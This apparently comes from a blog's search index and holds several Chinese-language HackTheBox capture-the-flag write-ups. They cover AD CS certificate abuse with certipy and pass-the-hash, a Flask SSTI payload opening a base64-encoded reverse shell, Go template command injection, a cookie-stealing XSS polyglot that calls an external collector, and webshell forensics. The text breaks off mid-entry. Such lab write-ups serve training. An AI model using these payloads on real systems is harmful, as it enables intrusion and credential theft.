<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox Manager WriteUP</title>
      <link href="/2023/10/30/HackTheBox-Manager-WriteUP/"/>
      <url>/2023/10/30/HackTheBox-Manager-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-21.png" alt="logo"></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="Get-User"><a href="#Get-User" class="headerlink" title="Get User"></a>Get User</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/2023-10-24-14-10-00-image.png"></p><h4 id="域名枚举"><a href="#域名枚举" class="headerlink" title="域名枚举"></a>域名枚举</h4><p>因为开着DNS服务，可以很方便的先收集一波子域名：</p><pre><code class="shell">dnsenum --dnsserver 10.10.11.236 --enum -p 0 -s 0 -o ~/HackTheBox/Manager/subdomain.txt -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt manager.htb</code></pre><p>获取到主机名：<code>dc01.manager.htb</code></p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/2023-10-24-14-15-17-image.png"></p><h4 id="SMB用户名枚举-弱口令"><a href="#SMB用户名枚举-弱口令" class="headerlink" title="SMB用户名枚举&#x2F;弱口令"></a>SMB用户名枚举&#x2F;弱口令</h4><pre><code>crackmapexec smb manager.htb -u &quot;anonymous&quot; -p &quot;&quot; --rid-brute</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-1.png" alt="Alt text"></p><p><code>operator</code>账户存在弱口令：</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-2.png" alt="operator"></p><h4 id="MSSQL弱口令"><a href="#MSSQL弱口令" class="headerlink" title="MSSQL弱口令"></a>MSSQL弱口令</h4><p>使用此密码尝试登录其他服务，登录MSSQL成功：</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-3.png" alt="Alt text"></p><p>读取系统目录，发现网站备份文件：</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-6.png" alt="Alt text"></p><h4 id="Web备份文件"><a href="#Web备份文件" class="headerlink" title="Web备份文件"></a>Web备份文件</h4><p>审计网站源码，发现配置文件中的账号密码：</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-8.png" alt=".old-conf"></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ldap-conf xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;   &lt;server&gt;      &lt;host&gt;dc01.manager.htb&lt;/host&gt;      &lt;open-port enabled=&quot;true&quot;&gt;389&lt;/open-port&gt;      &lt;secure-port enabled=&quot;false&quot;&gt;0&lt;/secure-port&gt;      &lt;search-base&gt;dc=manager,dc=htb&lt;/search-base&gt;      &lt;server-type&gt;microsoft&lt;/server-type&gt;      &lt;access-user&gt;         &lt;user&gt;raven@manager.htb&lt;/user&gt;         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;      &lt;/access-user&gt;      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;   &lt;/server&gt;   &lt;search type=&quot;full&quot;&gt;      &lt;dir-list&gt;         &lt;dir&gt;cn=Operator1,CN=users,dc=manager,dc=htb&lt;/dir&gt;      &lt;/dir-list&gt;   &lt;/search&gt;&lt;/ldap-conf&gt;</code></pre><p>使用此<code>evil-winrm</code>登录，获得user.txt：</p><pre><code>$ evil-winrm -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -i manager.htb</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-9.png" alt="Alt text"></p><h3 id="Get-Root"><a href="#Get-Root" class="headerlink" title="Get Root"></a>Get Root</h3><h4 id="收集用户名"><a href="#收集用户名" class="headerlink" title="收集用户名"></a>收集用户名</h4><p>Raven用户下可以看到完整的用户列表（crackmapexec默认只遍历RID1-4000的账户）：</p><pre><code>*Evil-WinRM* PS C:\Users\Raven\Documents&gt; Get-LocalUserName          Enabled Description----          ------- -----------Administrator True    Built-in account for administering the computer/domainGuest         True    Built-in account for guest access to the computer/domainkrbtgt        False   Key Distribution Center Service AccountZhong         TrueCheng         TrueRyan          TrueRaven         TrueJinWoo        TrueChinHae       TrueOperator      True</code></pre><p>查看是否有AD CS服务，检查到CA Name:<code>manager-DC01-CA</code></p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-11.png" alt="Alt text"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>利用证书配置错误，将raven提升为<code>officer</code>(Certificate Manager):</p><pre><code>certipy-ad ca -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -add-officer raven -ca &#39;manager-DC01-CA&#39;</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-12.png" alt="Alt text"></p><p>可以使用 <code>-enable-template</code> 参数在 CA 上启用 <code>SubCA</code> 模板。默认情况下，<code>SubCA</code> 模板已启用。</p><pre><code>certipy-ad ca -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -enable-template &#39;SubCA&#39;</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-13.png" alt="Alt text"></p><p>确认一下<code>SubCA</code>模板成功启用了</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-14.png" alt="list"></p><p>请求基于 SubCA 模板的证书，记录下<code>request ID</code>：</p><pre><code>certipy-ad req -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -template SubCA -upn administrator@manager.htb -target manager.htb</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-15.png" alt="Alt text"></p><p>使用 <code>ca</code> 命令和参数发出失败的 <code>-issue-request &lt;request ID&gt;</code> 证书请求，然后使用 req 命令和参数检索颁发的 -retrieve <request ID> 证书：</p><pre><code>$ certipy-ad ca -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -issue-request 45 $ certipy-ad req -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -target manager.htb -retrieve 45</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-16.png" alt="Alt text"></p><p>验证证书，提取哈希：</p><pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236 -domain manager.htb -username administrator</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-17.png" alt="Alt text"></p><p>利用hash登录administrator账户，获得root.txt</p><pre><code>evil-winrm -u administrator -H ae5064c2f62317332c88629e025924ef -i manager.htb</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-18.png" alt="Alt text"></p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-20.png" alt="Alt text"></p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-19.png" alt="Alt text"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>前前后后忙活了一个星期，在赛季结束之前把flag提交了。中间卡住很多次，比如爆破账号密码的时候直接用了字典，没有想到把用户名加到密码表中。以及后续提权，基本是把所有收集到的信息，对照网上查到的资料，一样一样的尝试（所以完整的wp写了700多行……），最后才root。</p><p>收获颇丰，收获颇丰。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> AD CS </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 暴力破解 </tag>
            
            <tag> 弱口令 </tag>
            
            <tag> SMB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Sandworm WriteUP</title>
      <link href="/2023/10/23/HackTheBox-Sandworm-WriteUP/"/>
      <url>/2023/10/23/HackTheBox-Sandworm-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image.png" alt="Logo"></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>题目给了IP，先端口扫描：</p><pre><code>rustscan -r 1-65535 -b 924 -t 2000 -a 10.10.11.218</code></pre><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-1.png" alt="rustscan"></p><p>Web服务访问一下，直接跳转到了<code>ssa.htb</code>。<br>配置好hosts文件之后上nmap再仔细扫一遍：</p><pre><code>echo &quot;10.10.11.218 ssa.htb&quot; &gt;&gt; /etc/hostsnmap -p 22,80,443 -A -v -Pn --open --script auth,vuln ssa.htb</code></pre><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-2.png" alt="nmap"></p><p>并没有找到更多有价值的信息。</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><pre><code class="bash">ffuf -u https://ssa.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -v -r</code></pre><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-3.png" alt="dir1"><br><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-4.png" alt="dir2"></p><p>其中<code>contact</code>是一个提交PGP加密信息的界面：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-5.png" alt="contact"></p><p><code>guide</code>是一个指导PGP加密的界面，包含加密、解密和验证等功能：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-6.png" alt="guide"></p><p>网站底部有<code>Powered by Flask™ </code>字样，看到这个第一反应应该就是用SSTI漏洞来打了。</p><h3 id="服务器端模板注入（SSTI）"><a href="#服务器端模板注入（SSTI）" class="headerlink" title="服务器端模板注入（SSTI）"></a>服务器端模板注入（SSTI）</h3><p>和XSS一样，找SSTI的注入点，首先应该找能够把我们输入的信息完整回显的地方。这里我们找到了<code>guide</code>页面的<code>Verify Signature</code>功能，它能返回我们签名pgp时使用的用户名（这里忘记截图了），简单<code>&#123;&#123;9*9&#125;&#125;</code>验证后证实存在SSTI漏洞。</p><p>后续反弹Shell利用的Payload如下：</p><pre><code>&#123;&#123; self.__init__.__globals__.__builtins__.__import__('os').popen('echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkvOTExIDA+JjE="|base64 -d|bash').read() &#125;&#125;</code></pre><p>首先我们在在线网站（<a href="https://pgptool.org/">PGP Tool</a>）生成PGP密钥对，在用户名处键入Payload：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-7.png" alt="generate"></p><p>然后生成签名信息：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-8.png" alt="sign"></p><p>将公钥和签名信息丢到网站中验证，成功反弹Shell：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-9.png" alt="reverseshell"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>当前用户目录下是没有user.txt的。我们在翻看了配置文件后，在<code>/home/atlas/.config/httpie/sessions/localhost_5000/admin.json</code>中发现了用户<code>silentobserver</code>的账号密码：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-10.png" alt="admin.json"></p><p>此用户能够在<code>login</code>页面直接登录，也能直接ssh登录到目标：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-11.png" alt="login"></p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-12.png" alt="ssh-1"></p><p>&lt;!–&gt;quietLiketheWind22&lt;!–&gt;</p><p>执行pspy64看一下进程，找到了一个atlas用户权限执行的定时任务：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-13.png" alt="pspy"></p><p>简化一下，然后问一下ChatGPT这是什么意思：</p><blockquote><p>这个命令是一个结合了 <code>echo</code> 和 <code>cargo</code> 的 shell 命令。我们来逐部分解这个命令：</p><ol><li><p><strong><code>echo &quot;e&quot;</code></strong>: 这是一个 shell 命令，用于输出 “e” 这个字符。</p></li><li><p><strong><code>|</code></strong>: 这是一个管道符号。在 shell 中，管道用于将前一个命令的输出作为下一个命令的输入。在这个场景下，它将 “e” 这个字符传递给了 <code>cargo run --offline</code> 命令。</p></li><li><p><strong><code>cargo run --offline</code></strong>: 这是 Cargo 的一个命令。</p><ul><li><strong><code>cargo run</code></strong>: 这是 Cargo 的一个命令，它编译并运行指定的 Rust 项目。</li><li><strong><code>--offline</code></strong>: 这个标志告诉 Cargo 在离线模式下运行，这意味着它不会尝试联网更新 crate 或解决依赖。它会使用本地缓存的依赖版本。</li></ul></li></ol><p>综合来看，<code>echo &quot;e&quot;|cargo run --offline</code> 的意思是：输出 “e” 这个字符，并将这个字符作为输入传递给 <code>cargo run --offline</code>。这通常是为了向 Rust 程序提供一些预期的输入，例如当 Rust 程序期望从标准输入中读取数据时。</p></blockquote><p>我们在先前获得的第一个Shell，用户权限就是<code>atlas</code>，但那实际上大概率只是一个沙箱环境：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-16.png" alt="sandbox"></p><p>所以我们也许需要再次获得atlas用户的真实权限。结合cargo的进程，我们修改rust程序的源码，就可以实现反弹Shell。但是很遗憾，我们并没有src目录的写入权限：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-15.png" alt="src"></p><p>继续翻目录，我们有<code>/opt/crates/logger/src/lib.rs</code>的写入权限，而<code>tipnet</code>刚好会调用logger的函数：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-17.png" alt="lib.rs"></p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-18.png" alt="logger"></p><p>那么，我们修改<code>lib.rs</code>的源码就可以了：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-19.png" alt="reverse-shell"></p><p>获得<code>atlas</code>用户的shell之后，可以看到当前用户下正在运行firejail：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-20.png" alt="firejail"></p><p>我们最初获得的Shell，应该就是这个沙箱的环境：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-21.png" alt="chatgpt"></p><p><code>firejail</code>存在公开的漏洞，我们直接找到exp利用就好：</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-23.png" alt="root"></p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-24.png" alt="Pwn"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>除了SSTI之前做过类似的challenge之外，其他几乎所有知识点都要现学。再次意识到，对于安全人员来说，现学现卖真是一样非常重要的能力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox RenderQuest WriteUP</title>
      <link href="/2023/09/25/HackTheBox-RenderQuest-WriteUP/"/>
      <url>/2023/09/25/HackTheBox-RenderQuest-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>You’ve found a website that lets you input remote templates for rendering. Your task is to exploit this system’s vulnerabilities to access and retrieve a hidden flag. Good luck!</p></blockquote><p>翻译：您发现了一个可以输入远程模板进行渲染的网站。您的任务是利用该系统的漏洞访问和检索一个隐藏标志。祝你好运！</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image.png" alt="challenge"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>根据描述，网站的功能是让我们提供一个远程的模板，网站对我们的模板进行渲染。远程站点我们可以用GitHubPages，可是我不会写Golang的模板，结题失败，此贴结束。</p><p>咳咳。</p><p>我不会写，让ChatGPT写一个不就完了。先写一个普通的看看长什么样：</p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Client &amp; Server Info&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;Client Information&lt;/h2&gt;    &lt;ul&gt;        &lt;li&gt;Client IP: &#123;&#123;.ClientIP&#125;&#125;&lt;/li&gt;        &lt;li&gt;User Agent: &#123;&#123;.ClientUA&#125;&#125;&lt;/li&gt;        &#123;&#123;with .ClientIpInfo&#125;&#125;            &lt;li&gt;IP Version: &#123;&#123;.IpVersion&#125;&#125;&lt;/li&gt;            &lt;li&gt;IP Address: &#123;&#123;.IpAddress&#125;&#125;&lt;/li&gt;            &lt;li&gt;Latitude: &#123;&#123;.Latitude&#125;&#125;&lt;/li&gt;            &lt;li&gt;Longitude: &#123;&#123;.Longitude&#125;&#125;&lt;/li&gt;            &lt;li&gt;Country Name: &#123;&#123;.CountryName&#125;&#125;&lt;/li&gt;            &lt;li&gt;Country Code: &#123;&#123;.CountryCode&#125;&#125;&lt;/li&gt;            &lt;li&gt;Time Zone: &#123;&#123;.TimeZone&#125;&#125;&lt;/li&gt;            &lt;li&gt;Zip Code: &#123;&#123;.ZipCode&#125;&#125;&lt;/li&gt;            &lt;li&gt;City Name: &#123;&#123;.CityName&#125;&#125;&lt;/li&gt;            &lt;li&gt;Region Name: &#123;&#123;.RegionName&#125;&#125;&lt;/li&gt;            &lt;li&gt;Continent: &#123;&#123;.Continent&#125;&#125;&lt;/li&gt;            &lt;li&gt;Continent Code: &#123;&#123;.ContinentCode&#125;&#125;&lt;/li&gt;        &#123;&#123;end&#125;&#125;    &lt;/ul&gt;    &lt;h2&gt;Server Information&lt;/h2&gt;    &lt;ul&gt;        &lt;li&gt;Hostname: &#123;&#123;.ServerInfo.Hostname&#125;&#125;&lt;/li&gt;        &lt;li&gt;Operating System: &#123;&#123;.ServerInfo.OS&#125;&#125;&lt;/li&gt;        &lt;li&gt;Kernel Version: &#123;&#123;.ServerInfo.KernelVersion&#125;&#125;&lt;/li&gt;        &lt;li&gt;Memory: &#123;&#123;.ServerInfo.Memory&#125;&#125;&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>丢给网站看看效果：</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-1.png" alt="template"></p><p>很好，模板生效了。看到这种题目，第一时间想到的，就是模板注入。检查源码我们可以看到源码中刚好定义了可以执行系统命令的方法：</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-2.png" alt="exec"></p><p>并且这个方法没有对传入的参数做任何过滤。那么，后面的事情就简单了。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>构造Payload查看flag文件的文件名：</p><pre><code class="HTML">    &lt;h2&gt;Get Flag&lt;/h2&gt;    &lt;ul&gt;        &lt;li&gt;Flag: &#123;&#123;.FetchServerInfo "ls /"&#125;&#125;&lt;/li&gt;    &lt;/ul&gt;</code></pre><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-3.png" alt="flag-file"></p><p>读取Flag(这一步Payload就不用多说了吧)：</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-4.png" alt="flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>感谢ChatGPT</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://xz.aliyun.com/t/12642">Go语言下的模板注入</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> Golang模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Obscure WriteUP</title>
      <link href="/2023/09/12/HackTheBox-Obscure-WriteUP/"/>
      <url>/2023/09/12/HackTheBox-Obscure-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>An attacker has found a vulnerability in our web server that allows arbitrary PHP file upload in our Apache server. Suchlike, the hacker has uploaded a what seems to be like an obfuscated shell (support.php). We monitor our network 24&#x2F;7 and generate logs from tcpdump (we provided the log file for the period of two minutes before we terminated the HTTP service for investigation), however, we need your help in analyzing and identifying commands the attacker wrote to understand what was compromised.</p></blockquote><p>翻译：</p><blockquote><p>攻击者在我们的 Web 服务器中发现了一个漏洞，该漏洞允许在我们的 Apache 服务器中上传任意 PHP 文件。 例如，黑客上传了一个看起来像是混淆的 shell (support.php)。 我们24&#x2F;7监控我们的网络并从tcpdump生成日志（我们在终止HTTP服务进行调查之前提供了两分钟的日志文件），但是，我们需要您的帮助来分析和识别攻击者编写的命令以理解 什么受到了损害。</p></blockquote><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image.png" alt="challenge"></p><p>题目给了一个PHP的WebShell文件，和一段流量。</p><h2 id="思路-解题"><a href="#思路-解题" class="headerlink" title="思路 &amp; 解题"></a>思路 &amp; 解题</h2><h3 id="WebShell分析"><a href="#WebShell分析" class="headerlink" title="WebShell分析"></a>WebShell分析</h3><p>首先看题目给的WebShell，很明显被混淆过了，但是是很简单的混淆：</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-1.png" alt="WebShell"></p><p>大体逻辑是，将若干字符串拼接并删除掉字符串中的干扰字符（第8行代码），然后作为一个新函数执行。那么，我们只需要<code>echo $u;</code>，就可以得到真实的代码：</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-2.png" alt="edited"></p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-3.png" alt="realcode"></p><p>随便找个在线网站优化一下格式：</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-4.png" alt="beautifier"></p><p>这里可以看到代码的基本逻辑：定义了一个<code>xor</code>加密的函数，将传入的数据进行<code>xor</code>+<code>base64</code>+<code>gzuncompress</code>三层处理，然后执行处理后的代码。</p><p>之后我们只需要从流量中找到攻击者的攻击流量，然后还原攻击者执行的代码，即可判断出攻击者的行为。这里我们先稍稍改动一下代码，直接把解密后的代码echo出来，然后把改动后的代码上传到我们自己的PHP服务器上。改动后的代码如下：</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-5.png" alt="poc"></p><p>接下来我们看流量。</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>既然知道了WebShell的文件名，那么用<code>http.request.uri contains &quot;support.php&quot;</code>可以很轻松的筛选出攻击者的攻击记录：</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-6.png" alt="1"></p><p>接下来，我们只需要重发攻击者的攻击流量到我们自己的服务器上，就可以看到攻击者的操作记录。在攻击者的最后一次操作记录中，我们发现攻击者拷贝走了本地的Keepass密码数据库：</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-7.png" alt="2"></p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-8.png" alt="3"></p><p>因为加解密流程都是一样的，那么我们把攻击者获取的Response数据作为Request包的数据流发送，就可以获得Keepass数据库文件的base64编码：</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-9.png" alt="keepass_base64"></p><p>使用以下命令可以还原出文件本体：</p><pre><code class="bash">cat base64.txt |base64 -d &gt; pwdb.kdbx</code></pre><h3 id="破解Keepass数据库"><a href="#破解Keepass数据库" class="headerlink" title="破解Keepass数据库"></a>破解Keepass数据库</h3><p>使用john The Ripper提取hash：</p><pre><code class="bash">keepass2john pwdb.kdbx &gt;hash.txt</code></pre><p>然后破解：</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-10.png" alt="crack"></p><p>最后打开Keepass数据库获得Flag即可（Keepass不允许截图，就不截了）。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>不难，但是挺有意思的一道题，需要的技能没有那么深，但是考点还挺杂的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox BabyEncryption WriteUp</title>
      <link href="/2023/09/11/HackTheBox-BabyEncryption-WriteUp/"/>
      <url>/2023/09/11/HackTheBox-BabyEncryption-WriteUp/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>You are after an organised crime group which is responsible for the illegal weapon market in your country. As a secret agent, you have infiltrated the group enough to be included in meetings with clients. During the last negotiation, you found one of the confidential messages for the customer. It contains crucial information about the delivery. Do you think you can decrypt it?</p></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目给出了密文和加密代码，加密代码如下：</p><pre><code class="python">import stringfrom secret import MSGdef encryption(msg):    ct = []    for char in msg:        ct.append((123 * char + 18) % 256)    return bytes(ct)ct = encryption(MSG)f = open(&#39;./msg.enc&#39;,&#39;w&#39;)f.write(ct.hex())f.close()</code></pre><p>可以看出是对原文的ASCII码进行了一些计算。考虑到ASCII码的取值范围也就那么大，直接把原有的加密方式抄过来然后遍历就好了。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>解密代码：</p><pre><code class="python">msg = open(&#39;msg.enc&#39;,&#39;r&#39;).readline()def judge(byte):    for i in range(0,255,1):        x = ((123 * i + 18) % 256)        if x == byte:            return chr(i)bts = bytes.fromhex(msg)flag = &#39;&#39;for byte in bts:    flag += judge(byte)print(flag)</code></pre><p><img src="/2023/09/11/HackTheBox-BabyEncryption-WriteUp/image-1.png" alt="flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>第一道Crypto题目，挺简单的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox TwoDots horror WriteUP</title>
      <link href="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/"/>
      <url>/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>Everything starts from a dot and builds up to two. Uniting them is like a kiss in the dark from a stranger. Made up horrors to help you cope with the real ones, join us to take a bite at the two-sentence horror stories on our very own TwoDots Horror™ blog.</p></blockquote><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image.png" alt="challenge"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先我们梳理一下网站的功能，非常清晰：注册用户、用户登录、发表帖子、上传头像、用户登出。</p><p>接下来梳理代码。</p><p><code>flag</code>的位置在<code>/bot.js</code>中：</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-1.png" alt="flag"></p><p>结合函数<code>purgeData(db)</code>，bot会主动访问网站的页面，那么我们最终大概率需要通过XSS来获取bot的cookie。</p><p>那么，我们来看<code>/review</code>的模板，关键代码如下：</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image9.png" alt="safe"></p><blockquote><p><strong>safe</strong> 过滤器通常在各种模板引擎中用于标记一个字符串为”安全的”，这意味着该字符串不应该被转义。 ——ChatGPT</p></blockquote><p>那么，板上钉钉的，<code>&#123;&#123; post.content|safe &#125;&#125;</code>位置存在XSS漏洞。后续的思路，就是构造payload，写入这个位置，并且利用。</p><p>利用的难点在于，网站开启了CSP(内容安全策略，Content Security Policy)。</p><blockquote><p>CSP（内容安全策略，Content Security Policy）是一个安全特性，用于防止各种常见的跨站脚本攻击 (XSS) 和其他代码注入攻击。CSP 允许网站管理员指定哪些内容源（例如 JavaScript、CSS、图片等）是可信的，从而控制网页可以加载和执行哪些资源。<br>CSP 是通过 HTTP 响应头 Content-Security-Policy 或等效的 <meta> 元素在 HTML 中实现的。<br>————ChatGPT</p></blockquote><p>这里的策略限制了网站只加载同源的资源，所以我们无法加载外部的JS脚本：</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-2.png" alt="CSP"></p><p>既然网站只能加载同源的JS脚本，那么我们就需要想办法将JS脚本上传到网站中。作为一个靶场，这个网站理论上不会有多余的功能，那么上传头像的功能我们理应可以利用的上。</p><p>多方查阅资料后，我们可以发现解决这个问题的骚操作：把JavaScript代码写入图片中：<a href="https://github.com/s-3ntinel/imgjs_polygloter">https://github.com/s-3ntinel/imgjs_polygloter</a></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先我们需要构造一个POC：</p><pre><code class="bash"># https://github.com/s-3ntinel/imgjs_polygloterpython3 img_polygloter.py jpg --height 666 --width 666 --payload &#39;window.location.href=&quot;http://rkfhc87j651n7m6f0va8pws5lwrnfc.oastify.com/grabber.php?c=&quot;+document.cookie;&#39; --output poc.jpg</code></pre><p>然后注册用户，将POC上传到头像：</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-3.png" alt="upload"></p><p><code>在/routes/index.js</code>中我们可以找到上传文件的访问路径：</p><p><img 